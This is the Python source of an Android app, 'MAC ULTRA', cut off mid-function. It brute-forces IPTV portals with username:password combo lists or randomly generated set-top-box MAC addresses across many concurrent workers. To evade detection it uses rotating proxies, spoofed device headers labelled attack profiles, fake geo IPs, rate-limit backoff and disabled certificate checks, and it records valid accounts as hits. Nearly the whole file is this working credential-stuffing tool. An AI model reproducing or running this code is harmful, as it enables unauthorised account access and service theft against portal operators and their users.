import os, asyncio, time, urllib.parse, urllib.request, httpx, random, ssl, json, socket, uuid
from datetime import datetime
from threading import Thread


import sys
import subprocess

REQUIRED_MODULES = ["httpx"]

for pkg in REQUIRED_MODULES:
    try:
        __import__(pkg)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
            print(f"{pkg} installiert.")
        except Exception as e:
            print(f"Fehler bei Installation von {pkg}: {e}")


os.makedirs("/storage/emulated/0/proxies/", exist_ok=True)
os.makedirs("/sdcard/Combo/", exist_ok=True)
os.makedirs("/storage/emulated/0/Hits/", exist_ok=True)
os.makedirs("/storage/emulated/0/MAC-ULTRA-Assets/", exist_ok=True)
os.makedirs("/storage/emulated/0/Portals/", exist_ok=True)

from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.spinner import Spinner
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.slider import Slider
from kivy.uix.progressbar import ProgressBar
from kivy.uix.image import Image
from kivy.core.clipboard import Clipboard
from kivy.graphics import Color, RoundedRectangle
from kivy.uix.screenmanager import ScreenManager, Screen

try:
    from jnius import autoclass
    MediaPlayer = autoclass('android.media.MediaPlayer')
    mPlayer = MediaPlayer()
    HAS_JNIUS = True
except:
    HAS_JNIUS = False

def get_device_ids():
    
    ids = set()
    try:
        from jnius import autoclass
        SettingsSecure = autoclass('android.provider.Settings$Secure')
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        android_id = SettingsSecure.getString(
            activity.getContentResolver(),
            SettingsSecure.ANDROID_ID
        )
        if android_id:
            ids.add(str(android_id).strip())
    except Exception:
        pass
    try:
        node = uuid.getnode()
        if node:
            ids.add(str(node).strip())
            ids.add(format(node, 'x').strip())
            ids.add(format(node, 'X').strip())
    except Exception:
        pass
    return ids

def load_client_rules():
    
    try:
        parts = ["https://raw.githubusercontent.com/", "PetReturn", "/", "Fake", "/main/", "sys_config.json"]
        url = "".join(parts) + f"?t={int(time.time())}"
        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/125 Mobile Safari/537.36",
                "Accept": "application/json,text/plain,*/*",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            }
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            raw = response.read().decode("utf-8", errors="ignore")
            return json.loads(raw)
    except Exception:
        return None

def client_is_allowed():
    
    data = load_client_rules()
    if not isinstance(data, dict): return False
    if not data.get("system_active", True): return False
    current_ids = get_device_ids()
    if not current_ids: return False
    for item in data.get("allowed_devices", []):
        if isinstance(item, dict) and str(item.get("device_id", "")).strip() in current_ids:
            return True
        if isinstance(item, str) and item.strip() in current_ids:
            return True
    return False

def show_access_denied():
    print("Zugriff nicht freigegeben.")
    print("Bitte sende deine Geräte-ID zur Freischaltung an den Administrator.")

def download_asset_file(url, path):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/125 Mobile Safari/537.36",
                "Accept": "*/*",
                "Cache-Control": "no-cache"
            }
        )
        with urllib.request.urlopen(req, timeout=20) as response:
            content = response.read()
            if content:
                with open(path, "wb") as f:
                    f.write(content)
                return True
    except Exception:
        pass
    return False

def prepare_assets():
    data = load_client_rules()
    if not isinstance(data, dict): return False
    assets = data.get("assets", {})
    png_name = str(assets.get("png", "mac-ultra.png")).strip() or "mac-ultra.png"
    mp3_name = str(assets.get("mp3", "music.mp3")).strip() or "music.mp3"
    branches = ["main", "master"]
    png_ok = os.path.exists(PNG_PATH) and os.path.getsize(PNG_PATH) > 0
    mp3_ok = os.path.exists(MP3_PATH) and os.path.getsize(MP3_PATH) > 0
    for branch in branches:
        if not png_ok:
            png_url = f"https://raw.githubusercontent.com/PetReturn/Fake/{branch}/{urllib.parse.quote(png_name)}"
            png_ok = download_asset_file(png_url, PNG_PATH)
        if not mp3_ok:
            mp3_url = f"https://raw.githubusercontent.com/PetReturn/Fake/{branch}/{urllib.parse.quote(mp3_name)}"
            mp3_ok = download_asset_file(mp3_url, MP3_PATH)
        if png_ok and mp3_ok: break
    return png_ok and mp3_ok

FAV_FILE = "/storage/emulated/0/Portals/favoriten_liste.json"
MUSIC_PATH = "/storage/emulated/0/MAC-ULTRA-Assets/music.mp3"
ASSET_DIR = "/storage/emulated/0/MAC-ULTRA-Assets"
PNG_PATH = os.path.join(ASSET_DIR, "mac-ultra.png")
MP3_PATH = os.path.join(ASSET_DIR, "music.mp3")
COMMON_PORTS = [80, 8080, 8880, 25461, 8000, 2082, 2086, 2095, 8443, 443]

BG_DARK = (0.01, 0.02, 0.04, 1)
CARD_COLOR = (0.05, 0.07, 0.12, 1)
CYAN = (0, 0.9, 1, 1)
GREEN = (0, 1, 0.5, 1)
RED = (1, 0.2, 0.2, 1)
YELLOW = (1, 0.8, 0, 1)
WHITE = (1, 1, 1, 1)

DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"

ATTACK_PROFILES = [
    {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721', 'X-User-Agent': 'Model: MAG254; Link: Ethernet'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, wie Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'},
    {'User-Agent': 'okhttp/4.9.1'},
    {'User-Agent': 'Kodi/20.2 (X11; Linux x86_64) App_Bitness/64'},
    {'User-Agent': 'Mozilla/5.0 (SMART-TV; Linux; Tizen 6.0) AppleWebkit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/76.0.3809.146 TV Safari/537.36'}
]

GEO_DATA = {
    'IT': {'ip': ['151', '185', '79', '93'], 'lang': 'it-IT,it;q=0.9', 'tz': 'Europe/Rome'},
    'DE': {'ip': ['85', '188', '93', '95'], 'lang': 'de-DE,de;q=0.9', 'tz': 'Europe/Berlin'},
    'FR': {'ip': ['5', '80', '78', '176'], 'lang': 'fr-FR,fr;q=0.9', 'tz': 'Europe/Paris'},
    'US': {'ip': ['3', '13', '34', '52'], 'lang': 'en-US,en;q=0.9', 'tz': 'America/New_York'},
    'ES': {'ip': ['83', '95', '79'], 'lang': 'es-ES,es;q=0.9', 'tz': 'Europe/Madrid'}
}

MAC_VARIANTS = ('00:1A:79:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:', '04:D6:AA:', '00:1B:79:', '00:2A:01:')

class StyledCard(BoxLayout):
    def __init__(self, bg_color=CARD_COLOR, radius=[15,], **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledButton(Button):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledSpinner(Spinner):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class PortalManagerScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.layout = BoxLayout(orientation="vertical", padding=[20, 40, 20, 20], spacing=15)
        self.layout.add_widget(Label(text="[color=00E6FF][b]MAC ULTRA FAVORITEN[/b][/color]", markup=True, size_hint_y=None, height=80, font_size="28sp"))
        input_card = StyledCard(orientation="vertical", size_hint_y=None, height=220, padding=15, spacing=12)
        self.new_portal_input = TextInput(hint_text="http://url.com:8080", multiline=False, size_hint_y=None, height=75, background_color=(0.1, 0.1, 0.1, 1), foreground_color=(1,1,1,1), padding=[10, 20])
        row = BoxLayout(size_hint_y=None, height=65, spacing=15)
        self.type_spinner = StyledSpinner(text="MAC PORTAL", values=("MAC PORTAL", "M3U PORTAL"), color=CYAN, bold=True)
        add_btn = StyledButton(text="HINZUFÜGEN", bg_color=(0.05, 0.15, 0.1, 1), color=GREEN, on_press=self.add_portal)
        row.add_widget(self.type_spinner); row.add_widget(add_btn)
        input_card.add_widget(self.new_portal_input); input_card.add_widget(row)
        self.layout.add_widget(input_card)
        header_row = BoxLayout(size_hint_y=None, height=30)
        header_row.add_widget(Label(text="MAC LISTE", color=YELLOW, bold=True)); header_row.add_widget(Label(text="M3U LISTE", color=CYAN, bold=True))
        self.layout.add_widget(header_row)
        lists_container = BoxLayout(spacing=15)
        self.mac_list = GridLayout(cols=1, spacing=8, size_hint_y=None); self.mac_list.bind(minimum_height=self.mac_list.setter('height'))
        self.m3u_list = GridLayout(cols=1, spacing=8, size_hint_y=None); self.m3u_list.bind(minimum_height=self.m3u_list.setter('height'))
        sc1 = ScrollView(); sc1.add_widget(self.mac_list); sc2 = ScrollView(); sc2.add_widget(self.m3u_list)
        lists_container.add_widget(sc1); lists_container.add_widget(sc2)
        self.layout.add_widget(lists_container)
        self.layout.add_widget(StyledButton(text="ZURÜCK ZUM SCANNER", size_hint_y=None, height=100, on_press=self.go_back, color=RED, bold=True))
        self.add_widget(self.layout)

    def load_favs(self):
        self.mac_list.clear_widgets(); self.m3u_list.clear_widgets()
        if not os.path.exists(FAV_FILE): return
        try:
            with open(FAV_FILE, 'r') as f: data = json.load(f)
            for url in data.get("mac", []): self.mac_list.add_widget(self.create_entry(url, "mac"))
            for url in data.get("m3u", []): self.m3u_list.add_widget(self.create_entry(url, "m3u"))
        except: pass

    def create_entry(self, url, p_type):
        card = StyledCard(size_hint_y=None, height=70, padding=5, spacing=5)
        btn = StyledButton(text=url.replace("http://", "").replace("https://", "")[:20], font_size="12sp", on_press=lambda x: self.copy_and_back(url))
        del_btn = StyledButton(text="X", size_hint_x=0.25, bg_color=(0.3, 0.05, 0.05, 1), color=RED, on_press=lambda x: self.delete_portal(url, p_type))
        card.add_widget(btn); card.add_widget(del_btn); return card

    def add_portal(self, *a):
        url = self.new_portal_input.text.strip()
        if not url.startswith("http"): return
        p_type = "mac" if "MAC" in self.type_spinner.text else "m3u"
        data = {"mac": [], "m3u": []}
        if os.path.exists(FAV_FILE):
            with open(FAV_FILE, 'r') as f: data = json.load(f)
        if url not in data[p_type]:
            data[p_type].append(url)
            with open(FAV_FILE, 'w') as f: json.dump(data, f)
            self.new_portal_input.text = ""; self.load_favs()

    def delete_portal(self, url, p_type):
        if not os.path.exists(FAV_FILE): return
        with open(FAV_FILE, 'r') as f: data = json.load(f)
        if url in data[p_type]: data[p_type].remove(url)
        with open(FAV_FILE, 'w') as f: json.dump(data, f)
        self.load_favs()

    def copy_and_back(self, url):
        Clipboard.copy(url); self.manager.get_screen('main').portal_input.text = url; self.manager.current = 'main'

    def go_back(self, *a): self.manager.current = 'main'

class MagUltraScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.box = BoxLayout(orientation="vertical", padding=[20, 35, 20, 20], spacing=15)
        Window.clearcolor = BG_DARK
        self.hits, self.checked, self.total_lines, self.running = 0, 0, 0, False
        self.hit_list, self.last_status, self.start_time = [], "READY", time.time()
        self.proxy_list, self.working_proxies, self.use_proxies = [], [], False
        self.error_streak = 0; self.request_count = 0
        self.portal_isp = "Unknown"
        self.current_api_path = "/player_api.php"
        self.current_api_method = "GET"
        
        self.box.add_widget(Image(source=PNG_PATH, size_hint_y=None, height=320, allow_stretch=True, keep_ratio=False))
        stats = GridLayout(cols=3, size_hint_y=None, height=110, spacing=15)
        self.cpm_label = self.create_stat_box(stats, "CPM", "0", YELLOW)
        self.status_code_label = self.create_stat_box(stats, "STATUS", "READY", CYAN)
        self.hit_count_label = self.create_stat_box(stats, "MAC ULTRA HITS", "0", GREEN)
        self.box.add_widget(stats)
        
        url_card = StyledCard(orientation="vertical", size_hint_y=None, height=380, padding=15, spacing=12)
        self.portal_input = TextInput(text="http://", multiline=False, size_hint_y=None, height=75)
        
        filter_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.portal_file_spinner = StyledSpinner(text="SELECT PORTAL LIST", values=self.load_portal_lists(), size_hint_x=0.6, color=YELLOW)
        self.country_filter = TextInput(hint_text="LAND (z.B. DE)", multiline=False, size_hint_x=0.4, background_color=(0.1, 0.12, 0.15, 1), foreground_color=WHITE, padding=[10, 15])
        filter_row.add_widget(self.portal_file_spinner); filter_row.add_widget(self.country_filter)
        
        det_row = BoxLayout(size_hint_y=None, height=50, spacing=10)
        self.engine_mode = StyledSpinner(text="MAC SCAN", values=("MAC SCAN", "M3U SCAN"), size_hint_x=0.4, color=CYAN)
        self.detail_slider = Slider(min=0, max=1, value=0, step=1, size_hint_x=0.2); self.detail_status = Label(text="NUR MAC/URL", color=RED, size_hint_x=0.4)
        self.detail_slider.bind(value=self.update_slider_label); det_row.add_widget(self.engine_mode); det_row.add_widget(self.detail_slider); det_row.add_widget(self.detail_status)
        btn_row = BoxLayout(spacing=15, size_hint_y=None, height=75)
        btn_row.add_widget(StyledButton(text="PASTE", on_press=self.paste_clip, color=CYAN))
        btn_row.add_widget(StyledButton(text="FAVORITEN", on_press=self.go_to_manager, color=YELLOW))
        url_card.add_widget(self.portal_input); url_card.add_widget(filter_row); url_card.add_widget(det_row); url_card.add_widget(btn_row); self.box.add_widget(url_card)
        
        cfg_card = StyledCard(orientation="vertical", size_hint_y=None, height=340, padding=15, spacing=10)
        m_row = BoxLayout(spacing=10, size_hint_y=None, height=60)
        self.scan_mode = StyledSpinner(text="COMBO FILE", values=("COMBO FILE", "RANDOM SCAN")); self.prefix_spinner = StyledSpinner(text="MAC's", values=MAC_VARIANTS, color=YELLOW)
        m_row.add_widget(self.scan_mode); m_row.add_widget(self.prefix_spinner)
        self.file_spinner = StyledSpinner(text="SELECT COMBO", values=self.load_combos(), height=60, color=CYAN)
        self.random_count = TextInput(text="1000", input_filter="int", height=60, halign="center")
        
        delay_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.delay_mode_spinner = StyledSpinner(text="NORMAL", values=("NORMAL", "SMART: 1-3s", "SMART: 2-4s", "SMART: 3-6s"), color=YELLOW)
        self.delay_value_display = Label(text="0.10s", color=YELLOW, size_hint_x=0.2); self.delay_slider = Slider(min=0.0, max=2.0, value=0.1, step=0.05, size_hint_x=0.4)
        self.delay_slider.bind(value=lambda i, v: setattr(self.delay_value_display, 'text', f"{v:.2f}s"))
        delay_row.add_widget(self.delay_mode_spinner); delay_row.add_widget(self.delay_value_display); delay_row.add_widget(self.delay_slider)
        
        bot_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.bot_label = Label(text="BOTS: 40", color=CYAN, size_hint_x=0.3)
        self.bot_slider = Slider(min=1, max=100, value=40, step=1, size_hint_x=0.7)
        self.bot_slider.bind(value=lambda i, v: setattr(self.bot_label, 'text', f"BOTS: {int(v)}"))
        bot_row.add_widget(self.bot_label); bot_row.add_widget(self.bot_slider)

        cfg_card.add_widget(m_row); cfg_card.add_widget(self.file_spinner); cfg_card.add_widget(self.random_count); cfg_card.add_widget(delay_row); cfg_card.add_widget(bot_row)
        self.box.add_widget(cfg_card)
        
        proxy_card = StyledCard(orientation="horizontal", size_hint_y=None, height=70, padding=10, spacing=10)
        self.proxy_source = StyledSpinner(text="FILE", values=("FILE", "FREE (ProxyScrape)"), size_hint_x=0.35); self.proxy_spinner = StyledSpinner(text="SELECT PROXY", values=self.load_proxies(), size_hint_x=0.35)
        self.proxy_toggle_btn = StyledButton(text="PROXY: OFF", size_hint_x=0.3, color=RED, on_press=self.toggle_proxy)
        proxy_card.add_widget(self.proxy_source); proxy_card.add_widget(self.proxy_spinner); proxy_card.add_widget(self.proxy_toggle_btn); self.box.add_widget(proxy_card)
        
        self.progress_label = Label(text="PROGRESS: 0 / 0", size_hint_y=None, height=20, color=CYAN); self.box.add_widget(self.progress_label); self.pbar = ProgressBar(max=100, value=0, size_hint_y=None, height=10); self.box.add_widget(self.pbar)
        self.scroll = ScrollView(); self.log_display = Label(text="Ready...", font_size="14sp", size_hint_y=None, markup=True, halign="left", valign="top"); self.log_display.bind(size=self.log_display.setter('text_size')); self.scroll.add_widget(self.log_display); self.box.add_widget(self.scroll)
        
        bottom_row = BoxLayout(size_hint_y=None, height=110, spacing=15)
        self.start_btn = StyledButton(text="START MAC ULTRA", size_hint_x=0.7, on_press=self.toggle, bg_color=(0.05, 0.15, 0.1, 1), color=GREEN)
        self.music_stop_btn = StyledButton(text="STOP MUSIC", size_hint_x=0.3, on_press=self.stop_native_audio, bg_color=(0.15, 0.05, 0.05, 1), color=RED)
        bottom_row.add_widget(self.start_btn); bottom_row.add_widget(self.music_stop_btn)
        self.box.add_widget(bottom_row)
        self.add_widget(self.box)

    async def find_working_port(self, base_url):
        clean_url = base_url.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
        self.update_log_safe(f"[color=FFFF00][SCAN][/color] Testing Ports for {clean_url}...")
        for port in COMMON_PORTS:
            if not self.running: return None
            Clock.schedule_once(lambda dt: setattr(self.status_code_label, 'text', f"P:{port}"))
            try:
                conn = asyncio.open_connection(clean_url, port)
                _, writer = await asyncio.wait_for(conn, timeout=1.2)
                writer.close()
                await writer.wait_closed()
                async with httpx.AsyncClient(timeout=1.5) as client:
                    test_url = f"http://{clean_url}:{port}"
                    r = await client.get(test_url)
                    if r.status_code in [200, 404, 403]:
                        self.update_log_safe(f"[color=00FF00][FOUND][/color] Port {port} is OPEN!")
                        return test_url
            except: continue
        return None

    async def discover_best_api(self, portal, ctx):
        endpoints = [
            {"name": "Player GET", "path": "/player_api.php", "method": "GET"},
            {"name": "Player POST", "path": "/player_api.php", "method": "POST"},
            {"name": "Panel GET", "path": "/panel_api.php", "method": "GET"},
        ]
        self.update_log_safe("[color=00FFFF][SCAN][/color] Teste API Endpunkte...")
        async with httpx.AsyncClient(verify=ctx, timeout=5.0) as client:
            for ep in endpoints:
                if not self.running: break
                try:
                    if ep["method"] == "GET":
                        r = await client.get(f"{portal}{ep['path']}?username=test&password=test")
                    else:
                        r = await client.post(f"{portal}{ep['path']}", data={"username": "test", "password": "test"})
                    if r.status_code == 200:
                        self.update_log_safe(f"[color=00FF00][API][/color] Nutze {ep['name']}")
                        return ep['path'], ep['method']
                except: continue
        return "/player_api.php", "GET"

    def check_vpn_restriction(self, response_text):
        triggers = ["blocked", "vpn", "proxy", "country lock", "not available in your country"]
        return any(t in response_text.lower() for t in triggers)

    def play_native_audio(self):
        if not HAS_JNIUS or not os.path.exists(MUSIC_PATH): return
        try:
            mPlayer.reset(); mPlayer.setDataSource(MUSIC_PATH); mPlayer.prepare(); mPlayer.setLooping(True); mPlayer.start()
        except: pass

    def stop_native_audio(self, *a):
        if not HAS_JNIUS: return
        try:
            if mPlayer.isPlaying(): mPlayer.stop()
        except: pass

    def create_stat_box(self, p, t, v, c):
        box = StyledCard(orientation="vertical", padding=8); box.add_widget(Label(text=t, font_size="11sp", color=(0.7,0.7,0.7,1))); lbl = Label(text=v, font_size="24sp", bold=True, color=c)
        box.add_widget(lbl); p.add_widget(box); return lbl

    def update_slider_label(self, i, v): self.detail_status.text, self.detail_status.color = ("ALLES SPEICHERN", GREEN) if v == 1 else ("NUR MAC/URL", RED)
    def load_combos(self): return sorted([f for f in os.listdir("/sdcard/Combo/") if f.endswith(".txt")]) if os.path.exists("/sdcard/Combo/") else ["NO FOLDER"]
    def load_proxies(self): return sorted([f for f in os.listdir("/storage/emulated/0/proxies/") if f.endswith(".txt")]) if os.path.exists("/storage/emulated/0/proxies/") else ["NO FOLDER"]
    
    def load_portal_lists(self):
        portal_dir = "/storage/emulated/0/Portals/"
        try:
            os.makedirs(portal_dir, exist_ok=True)
            files = [f for f in os.listdir(portal_dir) if f.endswith(".txt")]
            return sorted(files) + ["USE SINGLE"]
        except Exception:
            return ["USE SINGLE"]

    def paste_clip(self, *a): self.portal_input.text = Clipboard.paste().strip()
    def go_to_manager(self, *a): self.manager.get_screen('portals').load_favs(); self.manager.current = 'portals'
    def toggle_proxy(self, btn):
        self.use_proxies = not self.use_proxies
        if self.use_proxies: btn.text, btn.color, btn.bg_color_inst.rgba = "PROXY: ON", GREEN, (0.05, 0.15, 0.1, 1)
        else: btn.text, btn.color, btn.bg_color_inst.rgba = "PROXY: OFF", RED, (0.15, 0.05, 0.05, 1)

    def get_random_ip(self, geo):
        info = GEO_DATA.get(geo, GEO_DATA['DE']); return f"{random.choice(info['ip'])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"

    def detect_portal_geo(self, url):
        u = url.lower()
        if ".it" in u: return 'IT'
        elif ".es" in u: return 'ES'
        elif ".fr" in u: return 'FR'
        return 'DE'

    async def get_portal_isp_info(self, url):
        try:
            domain = url.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
            async with httpx.AsyncClient(timeout=5) as client:
                r = await client.get(f"http://ip-api.com/json/{domain}")
                data = r.json()
                if data.get('status') == 'success':
                    cc = data.get('countryCode', '??')
                    return f"[{cc}] {data.get('country')} | {data.get('isp', 'Unknown ISP')}"
        except: pass
        return "[??] Unknown ISP"

    async def smart_sleep(self, status):
        self.request_count += 1
        mode = self.delay_mode_spinner.text
        if "1-3s" in mode: d_min, d_max = 1, 3
        elif "2-4s" in mode: d_min, d_max = 2, 4
        elif "3-6s" in mode: d_min, d_max = 3, 6
        else: d_min = d_max = self.delay_slider.value
        delay = random.uniform(d_min, d_max)
        if status == 429:
            self.error_streak += 1; cooldown = min(15 + self.error_streak * 5, 90)
            self.update_log_safe(f"[color=FF0000][LIMIT][/color] 429 -> {cooldown}s Cooldown"); await asyncio.sleep(cooldown); return
        elif status in [403, 503]: self.error_streak += 1; delay += min(self.error_streak * 1.5, 8)
        else: self.error_streak = 0
        if self.request_count % 50 == 0: await asyncio.sleep(random.uniform(5, 12))
        await asyncio.sleep(delay + random.uniform(0, 0.2))

    def update_log_safe(self, t): Clock.schedule_once(lambda dt: self._do_log(t))
    def _do_log(self, t):
        self.hit_list.append(t)
        if len(self.hit_list) > 10: self.hit_list.pop(0)
        self.log_display.text = "\n".join(self.hit_list); self.log_display.height = self.log_display.texture_size[1] + 20

    async def check_proxies_stable(self, ctx):
        total = len(self.proxy_list)
        if total == 0: return False
        self.update_log_safe(f"[color=00FFFF][PROXY][/color] Checking {total} Proxies..."); valid, checked_count, sem = [], 0, asyncio.Semaphore(50)
        async def check_one(p):
            nonlocal checked_count
            try:
                async with sem:
                    async with httpx.AsyncClient(proxy=f"http://{p}", verify=ctx, timeout=4.0) as client:
                        r = await client.get("http://www.google.com")
                        if r.status_code == 200: valid.append(p)
            except: pass
            checked_count += 1
            if checked_count % 20 == 0 or checked_count == total: Clock.schedule_once(lambda dt: setattr(self.progress_label, 'text', f"PROXY: {len(valid)} UP / {checked_count} CHECKED"))
        await asyncio.gather(*[check_one(p) for p in self.proxy_list])
        self.working_proxies = valid; self.update_log_safe(f"[color=00FF00][PROXY][/color] {len(valid)} Proxies are READY!"); return len(valid) > 0

    def toggle(self, *_):
        if not self.running:
            self.running = True; self.play_native_audio()
            self.start_btn.text, self.start_btn.color = "STOP MAC ULTRA", RED
            self.start_btn.bg_color_inst.rgba = (0.15, 0.05, 0.05, 1)
            Thread(target=lambda: asyncio.run(self.engine()), daemon=True).start()
        else: 
            self.running = False; self.start_btn.text, self.start_btn.color = "START MAC ULTRA", GREEN
            self.start_btn.bg_color_inst.rgba = (0.05, 0.15, 0.1, 1)
            self.status_code_label.text = "STOPPED"; self.update_log_safe("[color=FF0000]!!! MAC ULTRA STOPPED !!![/color]")

    async def engine(self):
        portals = []
        if self.portal_file_spinner.text not in ["SELECT PORTAL LIST", "USE SINGLE"]:
            p_path = f"/storage/emulated/0/Portals/{self.portal_file_spinner.text}"
            if os.path.exists(p_path):
                with open(p_path, 'r') as f: portals = [l.strip().split('/c')[0].rstrip('/') for l in f if l.strip().startswith("http")]
        if not portals:
            single = self.portal_input.text.strip().split('/c')[0].rstrip('/')
            if single.startswith("http"): portals = [single]
        if not portals: self.update_log_safe("[color=FF0000][ERROR][/color] No Portals found!"); self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn()); return
        if len(portals) == 1 and ":" not in portals[0].replace("http://", "").replace("https://", ""):
            found_p = await self.find_working_port(portals[0])
            if found_p: portals = [found_p]
            else:
                self.update_log_safe("[color=FF0000][ERROR][/color] No Port found! Stopped."); self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn()); return
        ctx = ssl.create_default_context(); ctx.set_ciphers(DEFAULT_CIPHERS); ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
        self.current_api_path, self.current_api_method = await self.discover_best_api(portals[0], ctx)
        self.portal_isp = await self.get_portal_isp_info(portals[0])
        self.update_log_safe(f"[color=FFFF00][INFO][/color] Server: {self.portal_isp}")
        if self.use_proxies:
            if self.proxy_source.text == "FREE (ProxyScrape)":
                try: 
                    async with httpx.AsyncClient() as c:
                        r = await c.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http")
                        self.proxy_list = [p.strip() for p in r.text.split('\n') if p.strip()]
                except: pass
            else:
                f_p = f"/storage/emulated/0/proxies/{self.proxy_spinner.text}"
                if os.path.exists(f_p):
                    with open(f_p, 'r') as f: self.proxy_list = [l.strip() for l in f if l.strip()]
            if not await self.check_proxies_stable(ctx): self.update_log_safe("[color=FF0000][ERROR][/color] No Working Proxies!"); self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn()); return
        if self.scan_mode.text == "COMBO FILE":
            path = f"/sdcard/Combo/{self.file_spinner.text}"
            if not os.path.exists(path): self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn()); return
            with open(path, 'r', errors='ignore') as f: self.combo_data = [l.strip() for l in f if l.strip()]
        else:
            prefix = self.prefix_spinner.text if self.prefix_spinner.text != "MAC's" else "00:1A:79:"
            self.combo_data = [f"{prefix}{':'.join([f'{random.randint(0,255):02X}' for _ in range(3)])}" for _ in range(int(self.random_count.text or 1000))]
        self.total_lines, self.checked, self.hits, self.start_time, self.request_count = len(self.combo_data), 0, 0, time.time(), 0
        Clock.schedule_once(lambda dt: setattr(self.pbar, 'max', self.total_lines))
        queue = asyncio.Queue()
        for l in self.combo_data: queue.put_nowait(l)
        num_bots = int(self.bot_slider.value)
        await asyncio.gather(*[self.worker(queue, ctx, portals) for _ in range(num_bots)])
        self.running = False; Clock.schedule_once(lambda dt: self.reset_start_btn())

    def reset_start_btn(self, *a):
        self.start_btn.text, self.start_btn.color = "START MAC ULTRA", GREEN
        self.start_btn.bg_color_inst.rgba = (0.05, 0.15, 0.1, 1)

    async def worker(self, queue, ctx, portals):
        while self.running and not queue.empty():
            line = await queue.get()
            tasks = [self.process_check(line, p, ctx) for p in portals]
            await asyncio.gather(*tasks)
            await self.smart_sleep(int(self.last_status) if self.last_status.isdigit() else 200)
            self.checked += 1; Clock.schedule_once(lambda dt: self.refresh_ui())
            queue.task_done()

    async def process_check(self, line, portal, ctx):
        if not self.running: return
        det_geo = self.detect_portal_geo(portal); geo_i = GEO_DATA.get(det_geo, GEO_DATA['DE'])
        px_url = f"http://{random.choice(self.working_proxies)}" if self.use_proxies and self.working_proxies else None
        p_name = portal.replace("http://", "").replace("https://", "").split(":")[0]
        ua_headers = random.choice(ATTACK_PROFILES)
        async with httpx.AsyncClient(verify=ctx, timeout=12, proxy=px_url, follow_redirects=True) as client:
            try:
                portal_ip = socket.gethostbyname(portal.split("//")[-1].split(":")[0])
                sn, dev_id, fake_ip = "".join(random.choices("0123456789ABCDEF", k=13)), "".join(random.choices("0123456789abcdef", k=32)), self.get_random_ip(det_geo)
                if self.engine_mode.text == "M3U SCAN":
                    if ':' in line:
                        u, p = line.split(':')[:2]
                        if self.current_api_method == "GET":
                            r = await client.get(f"{portal}{self.current_api_path}?username={u}&password={p}", headers=ua_headers)
                        else:
                            r = await client.post(f"{portal}{self.current_api_path}", data={"username": u, "password": p}, headers=ua_headers)
                        self.last_status = str(r.status_code)
                        if self.check_vpn_restriction(r.text):
                            self.update_log_safe(f"[color=808080][{p_name}][/color] [color=FFFF00][VPN-LOCK][/color] {u}")
                            return
                        if r.status_code == 200 and 'user_info' in r.text:
                            js_all = r.json(); js = js_all.get('user_info', {})
                            if js.get('auth') == 1:
                                filter_val = self.country_filter.text.upper(); has_country = True
                                if filter_val:
                                    cat_r = await client.get(f"{portal}/player_api.php?username={u}&password={p}&action=get_live_categories", headers=ua_headers)
                                    cat_txt = cat_r.text.upper()
                                    has_country = any(c.strip() in cat_txt for c in filter_val.split(','))
                                if has_country:
